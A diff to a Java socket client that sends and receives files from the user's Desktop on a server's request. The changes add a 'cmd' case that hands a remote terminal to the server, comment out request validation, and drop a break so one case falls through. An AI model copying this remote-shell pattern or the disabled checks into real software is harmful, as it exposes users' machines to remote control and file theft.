@@ -14,8 +14,8 @@ import java.util.Scanner;
  class Client
 {
 
-    private InputStream input;
-    private OutputStream output;
+    public InputStream input;
+    public OutputStream output;
     private Socket socket;
     private String path=System.getProperty("user.home") + "/Desktop";
     /*
@@ -102,11 +102,6 @@ private void connect(Socket sock)
                     //the next String contain the path to the file
                     sendFile(scan.next());
                     break;
-                //list the files the server has in this client's folder
-                case "ls":
-                    //will work on the runtime command later..
-                    sendMsg("will work on this later....");
-                    break;
                 //getting a file from the client
                 case "upload":
                     //get rid of the uploaded file path in the client pc "we don't need it"
@@ -132,9 +127,11 @@ private void connect(Socket sock)
                 case "close":
                     close();
                     break;
-
+                case "cmd":
+                    Utilities.terminal(System.getProperty("os.name"),this);
+                    break;
                 default:
-                    System.out.println(request);
+                    System.out.print(request);
 
             }
             scan.close();
@@ -295,8 +292,8 @@ private void connect(Socket sock)
         Scanner scan;
         while ((request = in.readLine()) != null)
         {
-            if(!client.valid(request))
-                continue;
+//            if(!client.valid(request))
+//                continue;
             scan = new Scanner(request);
             next = scan.next();
             switch (next)
@@ -318,7 +315,7 @@ private void connect(Socket sock)
                     client.sendMsg(request);
                     //send the compressed file
                     client.sendFile("dir.zip");
-                    break;
+
                 default:
                     client.sendMsg(request);
 
